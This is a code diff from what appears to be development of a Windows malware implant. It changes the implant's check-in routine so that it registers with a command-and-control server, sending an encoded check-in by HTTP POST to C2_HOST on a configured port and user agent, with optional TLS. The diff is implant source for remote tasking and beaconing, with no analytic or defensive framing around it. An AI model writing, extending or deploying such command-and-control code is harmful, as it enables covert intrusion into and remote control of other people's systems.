@@ -1,5 +1,5 @@
 #define PB_ENABLE_MALLOC 1
-#include "debug.h"
+#include "include/debug.h"
 
 #include "implant.h"
 
@@ -7,7 +7,7 @@
 
 #include "include/execute.h"
 #include "include/httpclient.h"
-#include "http_client.h"
+//#include "http_client.h"
 
 #include <stdio.h>
 #include <string.h>
@@ -242,8 +242,16 @@ BOOL DoCheckin(TaskResponse *tResp, TaskRequest *tReq) {
     size_t inboundBufferSize = 0;
 	BYTE *outboundBuffer = EncodeImplantCheckin(&ic, &outboundBufferSize);
 	
-    LPBYTE response = SendToServer(POST_VERB, CHECKIN_PATH, outboundBuffer, outboundBufferSize, &inboundBufferSize);
-	
+    // LPBYTE response = SendToServer(POST_VERB, CHECKIN_PATH, outboundBuffer, outboundBufferSize, &inboundBufferSize);
+
+	LPBYTE response = HTTPRequest(L"POST", C2_HOST, REGISTER_PATH, C2_PORT, C2_UA				, outboundBuffer, outboundBufferSize, &inboundBufferSize, USE_TLS);
+    if (response != NULL) {
+        DEBUG_PRINTF("Register Sent!\n");
+        free(response);
+        return TRUE;
+    }
+
+
 	FreeTaskResponse(tResp);
 	free(outboundBuffer);
 	
